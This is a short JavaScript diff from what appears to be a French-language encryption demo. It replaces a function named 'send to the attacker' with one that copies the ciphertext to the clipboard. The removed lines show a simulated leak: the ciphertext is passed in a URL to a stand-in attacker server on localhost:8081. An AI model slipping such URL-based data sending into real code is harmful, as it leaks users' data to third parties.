@@ -41,8 +41,11 @@ async function chiffrer() {
     document.getElementById('resultat').style.display = 'block';
 }
 
-function envoyerALAttaquant() {
+function copierCiphertext() {
     if (!ciphertext) return;
-    // Le ciphertext passe par l'URL -- l'attaquant le recupere comme s'il avait capture le trafic
-    window.open('http://localhost:8081/?ct=' + encodeURIComponent(ciphertext), '_blank');
+    navigator.clipboard.writeText(ciphertext).then(function() {
+        var fb = document.getElementById('copyFeedback');
+        fb.textContent = 'Copie !';
+        setTimeout(function() { fb.textContent = ''; }, 2000);
+    });
 }
